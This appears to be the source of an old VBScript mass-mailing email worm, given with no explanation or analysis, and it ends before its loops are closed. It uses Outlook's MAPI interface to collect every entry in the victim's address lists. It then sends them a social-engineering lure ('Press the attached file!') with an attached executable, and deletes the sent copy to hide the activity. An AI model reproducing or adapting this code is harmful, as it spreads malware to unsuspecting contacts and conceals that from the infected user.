On Error Resume Next
Dim fso,a,b,c,d,e,f,ero
Set fso = CreateObject ("outlook.application")
Set a = fso.GetNameSpace ("MAPI")
If fso = "Outlook" Then
a.Logon "profile", "password"
For b = 1 To a.AddressLists.Count
Set c = a.AddressLists (b)
ero = 0
ero = ero + 1
Set d = fso.CreateItem (0)
For e = 1 To c.AddressEntries.Count
f = c.AddressEntries (ero)
d.Recipients.Add f
ero = ero + 1
Next
d.Subject = "Wow! It should be seen!"
d.Body = "Hi dear friend, I want to show you whot I has found in the Internet! Press the attached file!"
d.Attachments.Add "c:\windows\winpif.exe"
d.DeleteAfterSubmit = True
d.Send
